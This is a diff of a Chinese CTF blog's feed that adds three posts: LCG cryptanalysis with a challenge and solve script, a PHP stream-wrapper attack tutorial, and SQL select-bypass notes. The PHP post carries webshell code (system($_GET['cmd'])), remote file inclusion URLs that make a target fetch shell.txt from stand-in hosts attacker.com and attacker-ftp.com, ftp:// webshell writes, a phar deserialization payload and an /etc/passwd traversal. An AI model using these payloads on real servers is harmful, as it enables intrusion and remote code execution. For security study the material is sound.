@@ -23,23 +23,22 @@
     <published>2026-02-08T15:40:00.000Z</published>
     <updated>2026-02-11T13:52:41.035Z</updated>
     
+    <content type="html"><![CDATA[<script type="text/javascript" async  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script><script>MathJax = {  tex: {    inlineMath: [['$', '$'], ['\\(', '\\)']],    displayMath: [['$$', '$$'], ['\\[', '\\]']]  },  svg: {    fontCache: 'global'  }};</script><p> LCG（线性同余生成器）简记 </p><p>标签（空格分隔）： LCG</p><hr><h2 id="LCG-线性同余生成器"><a href="#LCG-线性同余生成器" class="headerlink" title="LCG(线性同余生成器)"></a>LCG(线性同余生成器)</h2><p>LCG属于PRNG(伪随机数生成器)和stream cipher(流密码)的一种，是一种产生伪随机数的方法。</p><br><center>$X_{n+1} =(a∗X_n +b) \ mod\ m$</center><br><p>其中，Xn代表第n个生成的随机数，X0被称为种子值。这里还定义了三个整数：a乘数、b增量、m模数，是产生器设定的常数。</p><p>1、m是随机序列的模数，必须一个大于0的正整数。一般是一个比较大的素数或者是2的幂，以便提供较长的周期长度。<br>2、a是乘数，必须是一个与m互素的正整数。<br>3、b是增量，也必须是一个与m互素的正整数。<br>4、$t_n$ &#x3D; $X_{n+1}$ -$X_{n}$,同理$t_{n-1}$&#x3D;$X_{n}$ -$X_{n-1}$</p><hr><h2 id="求其中参数公式如下"><a href="#求其中参数公式如下" class="headerlink" title="求其中参数公式如下"></a>求其中参数公式如下</h2><hr><h3 id="由-X-n-反推-X-n-1"><a href="#由-X-n-反推-X-n-1" class="headerlink" title="由$X_n$反推$X_{n+1}$"></a><strong>由$X_n$反推$X_{n+1}$</strong></h3><center>$X_{n} = a^{-1}*(X_{n+1} -b) \mod m$</center><p>Ps：<strong>$a^{-1}$是a的逆元</strong></p><hr><h3 id="求a"><a href="#求a" class="headerlink" title="求a"></a>求a</h3><p>求a可以表示为</p><center>$a=t_{n-1}^{-1}*t_{n}  \ mod \ m$</center><br><p>Ps：<strong>$t_{n-1}^{-1}$是$t_{n-1}$的逆元</strong></p><br><hr><h3 id="求b"><a href="#求b" class="headerlink" title="求b"></a>求b</h3><center> $b = (X_{n+1} - a*X_{n}) \ mod \ m$ </center><hr><h3 id="求m"><a href="#求m" class="headerlink" title="求m"></a>求m</h3><center>$t_{n}=X_{n+1}-X_{n}=(a*X_n+b)-(a*X_{n-1}+b)=a*(X_n-X_{n-1})=a*t_{n-1}\mod\ m$</center><center>$t_{n+1} t_{n-1} - t_n t_n = a*a*t_{n-1}*t_{n-1} - a*t_{n-1}*a*t_{n-1} = 0 \mod m$</center><p>即$T_n &#x3D; t_{n+1} t_{n-1} - t_n^2$是 m 的倍数，故$T_n 和 T_{n-1}$的最大公因数即为 m</p><hr><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>实际做题的话碰到直接给了a,b,m这些便很好解决如果是碰上别的如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">from secrets import randbits</span><br><span class="line">from secret import FLAG, P_known</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def gen():</span><br><span class="line">    while True:</span><br><span class="line">        m = randbits(63) | (1 &lt;&lt; 62) | 1</span><br><span class="line">        if m &gt; 2**62:</span><br><span class="line">            break</span><br><span class="line">    a = randbits(62) | 3</span><br><span class="line">    c = randbits(62) | 1</span><br><span class="line">    s0 = randbits(62) | 5</span><br><span class="line">    return m, a, c, s0</span><br><span class="line"></span><br><span class="line">def LCG(m, a, c, s0, nblocks):</span><br><span class="line">    x = s0</span><br><span class="line">    out = []</span><br><span class="line">    for _ in range(nblocks):</span><br><span class="line">        x = (a * x + c) % m</span><br><span class="line">        out.append(x)</span><br><span class="line">    return out</span><br><span class="line"></span><br><span class="line">def encrypt(m, a, c, s0, plaintext: bytes) -&gt; bytes:</span><br><span class="line">    padlen = (-len(plaintext)) % 8</span><br><span class="line">    pt = plaintext + b&#x27;\x00&#x27; * padlen</span><br><span class="line">    blocks = [int.from_bytes(pt[i:i+8], &#x27;big&#x27;) for i in range(0, len(pt), 8)]</span><br><span class="line">    ks = LCG(m, a, c, s0, len(blocks))</span><br><span class="line">    cblocks = [b ^ k for b, k in zip(blocks, ks)]</span><br><span class="line">    return b&#x27;&#x27;.join(cb.to_bytes(8, &#x27;big&#x27;) for cb in cblocks)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    m, a, c, s0 = gen()</span><br><span class="line">    cipher  = encrypt(m, a, c, s0,  P_known + FLAG)</span><br><span class="line"></span><br><span class="line">    C_known = cipher[:len(P_known)]</span><br><span class="line">    C_flag  = cipher[len(P_known):len(P_known) + len(FLAG)]</span><br><span class="line"></span><br><span class="line">    print(&quot;P_known =&quot;,P_known)</span><br><span class="line">    print(&quot;C_known =&quot;, C_known.hex())</span><br><span class="line">    print(&quot;C_flag  =&quot;, C_flag.hex())</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">P_know = b&#x27;Insecure_linear_congruential_random_number!!!!!!&#x27;</span><br><span class="line">C_known = 44e18dfa1acd14aa790fc3bac4ca54c137bcd47bdfc2209a53b83715ecad3e29249845720588cac007bfb94f8476d91a</span><br><span class="line">C_flag  = 1995374a5b64c6696578c1d5bdc6fa3d1e974b813436eab4348db801fb7a6703658eaa4fefa2c6fd6792beb969df8ca70ad87a4f4aea6ca0040d65a3c1e3a5bf2655cafc1e5603a171edc9aa077c0ca264677c351907f35756c14dd7ece428cb424a3804b544ccb53e99935f9bc2d8483dd7587379c99b3542c222008a</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>这个便是已知明文攻击，将明文和密文已知部分进行异或便能得到一部分的$X_{n}$<br>然后再是正常解题<br>exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">from secrets import randbits</span><br><span class="line">import sys</span><br><span class="line">from functools import reduce</span><br><span class="line">from math import gcd</span><br><span class="line">import gmpy2</span><br><span class="line">p_know = b&#x27;Insecure_linear_congruential_random_number!!!!!!&#x27;</span><br><span class="line">c_know = &#x27;44e18dfa1acd14aa790fc3bac4ca54c137bcd47bdfc2209a53b83715ecad3e29249845720588cac007bfb94f8476d91a&#x27;</span><br><span class="line">c_flag  =  &#x27;1995374a5b64c6696578c1d5bdc6fa3d1e974b813436eab4348db801fb7a6703658eaa4fefa2c6fd6792beb969df8ca70ad87a4f4aea6ca0040d65a3c1e3a5bf2655cafc1e5603a171edc9aa077c0ca264677c351907f35756c14dd7ece428cb424a3804b544ccb53e99935f9bc2d8483dd7587379c99b3542c222008a&#x27;</span><br><span class="line"></span><br><span class="line">c_know = bytes.fromhex(c_know)</span><br><span class="line">c_flag = bytes.fromhex(c_flag)</span><br><span class="line"></span><br><span class="line">c_know=[int.from_bytes(c_know[i:i+8], &#x27;big&#x27;) for i in range(0, len(c_know), 8)]</span><br><span class="line">p_know=[int.from_bytes(p_know[i:i+8], &#x27;big&#x27;) for i in range(0, len(p_know), 8)]</span><br><span class="line"></span><br><span class="line">box = [p ^ c for p, c in zip(p_know, c_know)]</span><br><span class="line">t = [box[i+1]-box[i] for i in range(len(box)-1)]</span><br><span class="line">T1= t[3]*t[1]-t[2]*t[2]</span><br><span class="line">T2= t[4]*t[2]-t[3]*t[3]</span><br><span class="line"></span><br><span class="line">def egcd(a,b):</span><br><span class="line">    if a==0 :</span><br><span class="line">        return b</span><br><span class="line">    else :</span><br><span class="line">        return gcd(b%a,a)</span><br><span class="line"></span><br><span class="line">m=egcd(T1,T2)</span><br><span class="line">print(m)</span><br><span class="line"></span><br><span class="line">t1=box[2]-box[1]</span><br><span class="line">t0=box[1]-box[0]</span><br><span class="line">a=gmpy2.divm(t1,t0,m)</span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line">b=(box[2]-box[1]*a)%m</span><br><span class="line">print(b)</span><br><span class="line"></span><br><span class="line">def LCG(m, a, c, s0, nblocks):</span><br><span class="line">    x = s0         </span><br><span class="line">    out = []      </span><br><span class="line">    for _ in range(nblocks):</span><br><span class="line">        out.append(x)           </span><br><span class="line">        x = (a * x + c) % m     </span><br><span class="line">    return out</span><br><span class="line"></span><br><span class="line">abox = LCG(m, a, b, box[0], 22)</span><br><span class="line"></span><br><span class="line">abox = LCG(m, a, b, box[0], 22)</span><br><span class="line">raw_c_know = bytes.fromhex(&#x27;44e18dfa1acd14aa790fc3bac4ca54c137bcd47bdfc2209a53b83715ecad3e29249845720588cac007bfb94f8476d91a&#x27;)</span><br><span class="line">raw_c_flag = bytes.fromhex(&#x27;1995374a5b64c6696578c1d5bdc6fa3d1e974b813436eab4348db801fb7a6703658eaa4fefa2c6fd6792beb969df8ca70ad87a4f4aea6ca0040d65a3c1e3a5bf2655cafc1e5603a171edc9aa077c0ca264677c351907f35756c14dd7ece428cb424a3804b544ccb53e99935f9bc2d8483dd7587379c99b3542c222008a&#x27;)</span><br><span class="line"></span><br><span class="line">allm = raw_c_know + raw_c_flag</span><br><span class="line"></span><br><span class="line">keystream = b&#x27;&#x27;.join(k.to_bytes(8, &#x27;big&#x27;) for k in abox)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = bytes([c ^ k for c, k in zip(allm, keystream)])</span><br><span class="line">print(flag.decode(errors=&#x27;ignore&#x27;))</span><br></pre></td></tr></table></figure>]]></content>
+    
     
       
       
-        
-        
     <summary type="html">&lt;script type=&quot;text/javascript&quot; async
   src=&quot;https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js&quot;&gt;
 &lt;/script&gt;
 &lt;script&gt;
 MathJax = {
- </summary>
-        
+  t</summary>
       
     
     
     
-    <category term="Crypto" scheme="https://smileless-l.github.io/categories/crypto/"/>
+    <category term="Crypto" scheme="https://smileless-l.github.io/categories/Crypto/"/>
     
     
     <category term="LCG" scheme="https://smileless-l.github.io/tags/LCG/"/>
@@ -53,54 +52,22 @@ MathJax = {
     <published>2026-02-07T20:04:00.000Z</published>
     <updated>2026-02-07T20:04:51.941Z</updated>
     
+    <content type="html"><![CDATA[<h1 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h1><p>标签 ： PHP</p><hr><h2 id="伪装协议"><a href="#伪装协议" class="headerlink" title="伪装协议"></a>伪装协议</h2><pre><code>1 file://2 http://3 ftp://4 php://5 zlib://6 data://7 glob://8 phar://9 ssh2://10 rar://11 ogg://12 expect://</code></pre><p><strong>常见过滤器：</strong></p><ul><li><code>convert.base64-encode</code> &#x2F; <code>convert.base64-decode</code></li><li><code>convert.quoted-printable-encode</code></li><li><code>string.rot13</code></li><li><code>string.strip_tags</code></li></ul><hr><h2 id="php-filter-详解："><a href="#php-filter-详解：" class="headerlink" title="php:&#x2F;&#x2F;filter 详解："></a><strong>php:&#x2F;&#x2F;filter 详解：</strong></h2><ul><li><p><strong>读取模式（read）</strong><br>语法：<code>php://filter/read=filter_name/resource=target_file</code><br>示例：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=index.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>此时会将 <code>index.php</code> 的源码进行 Base64 编码后输出，绕过直接执行 PHP 代码，常用于源码泄露。</p></li><li><p><strong>写入模式（write）</strong><br>语法：<code>php://filter/write=filter_name/resource=target_file</code><br>示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data</span> = <span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>; <span class="comment">// 要写入的内容</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&quot;php://filter/write=string.rot13/resource=shell.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$target</span>, <span class="title function_ invoke__">str_rot13</span>(<span class="variable">$data</span>)); <span class="comment">// 注意需对数据预处理</span></span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="file-详解"><a href="#file-详解" class="headerlink" title="file:&#x2F;&#x2F;详解"></a><strong>file:&#x2F;&#x2F;详解</strong></h2><p>file:&#x2F;&#x2F; 封装器允许 PHP 像处理 URL 一样处理本地文件路径，这使得 PHP 可以使用统一的 I&#x2F;O 函数（如 fopen()、file_get_contents() 等）来操作本地文件。</p><p>语法：<code>file:///path/to/your/file</code> </p><p>由于php文件的操作函数会默认使用file:&#x2F;&#x2F;协议来处理</p><p><strong>原理展示</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">程序代码:include($_get[`page`]);</span><br><span class="line">用户输入:../../../etc/passwd</span><br><span class="line">实际处理: include(`file://../../../etc/passwd`)</span><br></pre></td></tr></table></figure><p>就可以根据file:&#x2F;&#x2F;协议来进行目录遍历，从而获得目标文件</p><hr><h2 id="data-详解"><a href="#data-详解" class="headerlink" title="data:&#x2F;&#x2F;详解"></a><strong>data:&#x2F;&#x2F;详解</strong></h2><p>基本语法<code>data:[&lt;MIME-type&gt;][;charset=&lt;encoding&gt;][;base64],&lt;data&gt;</code><br>工作方式： 当 PHP 遇到这个协议时，它不会进行任何网络或文件系统的操作，而是直接从 URI 的 <data> 部分提取内容，并将其作为文件内容提供给函数（如 include, file_get_contents 等）。</p><p>攻击案例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(file_get_contents($file2) === &quot;hello ctf&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            include($file1);</span><br><span class="line">        &#125;</span><br><span class="line">        //就需要构造file2=data://text/plain,hellow ctf</span><br></pre></td></tr></table></figure><hr><h2 id="http-详解"><a href="#http-详解" class="headerlink" title="http:&#x2F;&#x2F;详解"></a><strong>http:&#x2F;&#x2F;详解</strong></h2><p>它与我们之前讨论的 file:&#x2F;&#x2F;（本地文件）和 data:&#x2F;&#x2F;（嵌入数据）不同，http:&#x2F;&#x2F; 是用来连接到 Web 服务器并获取其内容的。</p><p>**<code>http://</code>**协议是实现远程文件包含的重要伪协议</p><p><em><strong>攻击前提</strong></em>：攻击前提条件（关键）： 要利用 http:&#x2F;&#x2F; 来包含文件，PHP 配置文件中的 allow_url_include 必须设置为 On。如果只是 file_get_contents() 或 fopen()，只需要 allow_url_fopen &#x3D; On。</p><p>攻击步骤：<br>攻击者首先在自己的服务器（例如 <a href="http://attacker.com)上创建一个包含/">http://attacker.com）上创建一个包含</a> PHP 代码的文件，例如 shell.txt：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    system($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>攻击的目标存在一个文件包含漏洞（include($get_[<code>a</code>])）<br>   然后利用http:&#x2F;&#x2F;协议来进行攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://target.com/ &lt; target.php &gt; ? a = http://attacker.com/shell.txt</span><br></pre></td></tr></table></figure><p>后续可以依靠antsword和hackbar等工具进行攻击</p><hr><h2 id="ftp-详解"><a href="#ftp-详解" class="headerlink" title="ftp:&#x2F;&#x2F;详解"></a><strong>ftp:&#x2F;&#x2F;详解</strong></h2><p>工作方式： PHP 会尝试根据 URL 中提供的信息连接到指定的 FTP 服务器，并对该服务器上的文件进行读取、写入或修改操作（取决于使用的函数和 FTP 权限）。</p><p>URL格式**<code>ftp://[username[:password]@]hostname[:port]/path/to/file</code>**</p><h2 id="攻击方法1"><a href="#攻击方法1" class="headerlink" title="攻击方法1"></a>攻击方法1</h2><p>依旧是在include()漏洞存在的情况和上述http:&#x2F;&#x2F;协议一样，在自己的服务器(<a href="http://attacker.com)上面的文件可以上传到目标漏洞的服务器,然后在根据include/">http://attacker.com)上面的文件可以上传到目标漏洞的服务器，然后在根据include</a>($_get [ <code>a</code>])来进行攻击<br>攻击如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/&lt;target.php&gt;?a=ftp://anonymous@attacker-ftp.com/shell.txt</span><br></pre></td></tr></table></figure><p>此时假设可以匿名且无密码</p><p>结果： 漏洞程序会通过 FTP 下载 shell.txt 的内容，然后 include() 函数会执行其中的 PHP 代码，导致 RCE（远程代码执行）    </p><h2 id="攻击方法2"><a href="#攻击方法2" class="headerlink" title="攻击方法2"></a>攻击方法2</h2><p>如果应用程序允许用户控制目标路径和写入内容，并且使用了 fopen() 或 file_put_contents()，理论上可以滥用 ftp:&#x2F;&#x2F; 来修改远程 FTP 服务器上的文件（例如修改一个 Web 目录下的文件来植入 Webshell）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$target = &quot;ftp://user:pass@target-ftp.com/www/config.php&quot;;</span><br><span class="line">$data = &quot;&lt;?php system(&#x27;id&#x27;); ?&gt;&quot;;</span><br><span class="line">file_put_contents($target, $data);</span><br></pre></td></tr></table></figure><hr><h2 id="phar-详解"><a href="#phar-详解" class="headerlink" title="phar:&#x2F;&#x2F;详解"></a><strong>phar:&#x2F;&#x2F;详解</strong></h2><p>Phar（PHP Archive） 是PHP的打包格式，类似于Java的JAR文件。phar:&#x2F;&#x2F;伪协议允许直接访问Phar文件内部的内容。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>攻击者利用目标系统中存在的<strong>文件包含漏洞</strong>（如 <code>include($_GET[&#39;a&#39;]);</code>），结合PHP支持的伪协议，可实现远程代码执行。在已知可通过 <code>http://</code> 协议进行远程文件包含的基础上，进一步利用 <code>ftp://</code> 和 <code>phar://</code> 等协议扩大攻击面。<br>####攻击思路<br>当PHP代码中存在文件操作函数（如file_get_contents()、include()、unlink()等）且用户能控制参数时，可能触发反序列化漏洞。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">创建恶意文件</span><br><span class="line">&lt;?php</span><br><span class="line">class EvilClass &#123;</span><br><span class="line">    public $cmd = &#x27;whoami&#x27;;</span><br><span class="line">    </span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        system($this-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 创建Phar文件</span><br><span class="line">$phar = new Phar(&#x27;evil.phar&#x27;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(&#x27;test.txt&#x27;, &#x27;test&#x27;);</span><br><span class="line">$phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;);</span><br><span class="line"></span><br><span class="line">// 添加恶意对象</span><br><span class="line">$object = new EvilClass();</span><br><span class="line">$object-&gt;cmd = $_GET[&#x27;cmd&#x27;];  // RCE命令</span><br><span class="line">$phar-&gt;setMetadata($object);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line">// 重命名绕过上传限制</span><br><span class="line">rename(&#x27;evil.phar&#x27;, &#x27;evil.jpg&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><hr><h3 id="ftp-协议攻击详解"><a href="#ftp-协议攻击详解" class="headerlink" title="ftp:&#x2F;&#x2F; 协议攻击详解"></a><strong>ftp:&#x2F;&#x2F; 协议攻击详解</strong></h3><p>PHP 支持通过 <code>ftp://</code> 协议访问远程 FTP 服务，其格式为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp://[username[:password]@]hostname[:port]/path/to/file</span><br></pre></td></tr></table></figure><h4 id="攻击方法-1：结合文件包含进行-RCE"><a href="#攻击方法-1：结合文件包含进行-RCE" class="headerlink" title="攻击方法 1：结合文件包含进行 RCE"></a><strong>攻击方法 1：结合文件包含进行 RCE</strong></h4><p>当存在 <code>include($_GET[&#39;a&#39;])</code> 漏洞时，攻击者可构造如下请求：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://target.com/vuln.php?a=ftp://anonymous@attacker-ftp.com/shell.txt</span><br></pre></td></tr></table></figure><p>若目标服务器可出站连接且 FTP 服务允许匿名访问，PHP 将下载 <code>shell.txt</code> 并解析其中的 PHP 代码，造成<strong>远程代码执行（RCE）</strong>。</p><h4 id="攻击方法-2：写入远程-FTP-文件（反向利用）"><a href="#攻击方法-2：写入远程-FTP-文件（反向利用）" class="headerlink" title="攻击方法 2：写入远程 FTP 文件（反向利用）"></a><strong>攻击方法 2：写入远程 FTP 文件（反向利用）</strong></h4><p>若应用使用 <code>file_put_contents()</code> 或 <code>fopen()</code> 写入文件，且路径可控，则可滥用 <code>ftp://</code> 修改远程 FTP 服务器上的文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$target</span> = <span class="string">&quot;ftp://user:pass@target-ftp.com/public_html/backup.php&quot;</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="string">&quot;&lt;?php system(<span class="subst">$_GET</span>[&#x27;cmd&#x27;]); ?&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$target</span>, <span class="variable">$data</span>);</span><br></pre></td></tr></table></figure><p>成功后将在目标 Web 目录下植入 WebShell，实现持久化控制。</p><hr>]]></content>
+    
     
       
       
-        
-        
-    <summary type="html">&lt;h1&gt;PHP伪协议&lt;/h1&gt;
-&lt;p&gt;标签 ： PHP&lt;/p&gt;
+    <summary type="html">&lt;h1 id=&quot;PHP伪协议&quot;&gt;&lt;a href=&quot;#PHP伪协议&quot; class=&quot;headerlink&quot; title=&quot;PHP伪协议&quot;&gt;&lt;/a&gt;PHP伪协议&lt;/h1&gt;&lt;p&gt;标签 ： PHP&lt;/p&gt;
 &lt;hr&gt;
-&lt;h2 id=&quot;伪装协议&quot;&gt;&lt;a class=&quot;header-anchor&quot; href=&quot;#伪装协议&quot;&gt;¶&lt;/a&gt;伪装协议&lt;/h2&gt;
-&lt;pre&gt;&lt;code&gt;1 file://
-2 http://
-3</summary>
-        
+&lt;h2 id=&quot;伪装协议&quot;&gt;&lt;a href=&quot;#伪装协议&quot; class=</summary>
       
     
     
     
-    <category term="Web" scheme="https://smileless-l.github.io/categories/web/"/>
+    <category term="Web" scheme="https://smileless-l.github.io/categories/Web/"/>
     
     
     <category term="PHP" scheme="https://smileless-l.github.io/tags/PHP/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>SQL union联合注入</title>
-    <link href="https://smileless-l.github.io/2026/01/28/SQL%20union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"/>
-    <id>https://smileless-l.github.io/2026/01/28/SQL%20union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</id>
-    <published>2026-01-28T13:45:00.000Z</published>
-    <updated>2026-02-06T16:58:56.357Z</updated>
-    
-    
-      
-      
-        
-        
-    <summary type="html">&lt;h1&gt;SQL union联合注入&lt;/h1&gt;
-&lt;p&gt;标签（空格分隔）： SQL&lt;/p&gt;
-&lt;p&gt;—首先数据库的定义:</summary>
-        
-      
-    
-    
-    
-    <category term="Web" scheme="https://smileless-l.github.io/categories/web/"/>
-    
-    
-    <category term="SQL" scheme="https://smileless-l.github.io/tags/SQL/"/>
     
   </entry>
   
@@ -111,24 +78,19 @@ MathJax = {
     <published>2026-01-28T13:45:00.000Z</published>
     <updated>2026-02-06T17:05:20.554Z</updated>
     
+    <content type="html"><![CDATA[<h1 id="SQL’select’绕过"><a href="#SQL’select’绕过" class="headerlink" title="SQL’select’绕过"></a>SQL’select’绕过</h1><p>标签（空格分隔）： SQL绕过</p><hr><p>##直接查询<br>handler函数使用<br><code>语法</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">先是创造句柄</span><br><span class="line">handler `()` open as p;</span><br><span class="line"></span><br><span class="line">然后是查看数据</span><br><span class="line"># 获取第一行数据</span><br><span class="line">handler p read handler_index first;</span><br><span class="line"># 获取下一行数据</span><br><span class="line">handler p read handler_index next;</span><br><span class="line"># 获取上一行数据</span><br><span class="line">handler p read handler_index prev;</span><br><span class="line"># 获取最后一行数据</span><br><span class="line">handler p read handler_index last;</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><p>##改表和行名<br>alter函数使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">先将原来表名改为别的: alter table `默认的` rename to `sss`</span><br><span class="line">重命名表：alter table &#x27;表名&#x27; rename to &#x27;默认查寻的表名&#x27;。</span><br><span class="line">重命名字段：alter table &#x27;默认查询的表名&#x27; change &#x27;要转移的字段&#x27; &#x27;默认查询的字段&#x27; column_type（就是varchar(100)）;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
+    
     
       
       
-        
-        
-    <summary type="html">&lt;h1&gt;SQL’select’绕过&lt;/h1&gt;
-&lt;p&gt;标签（空格分隔）： SQL绕过&lt;/p&gt;
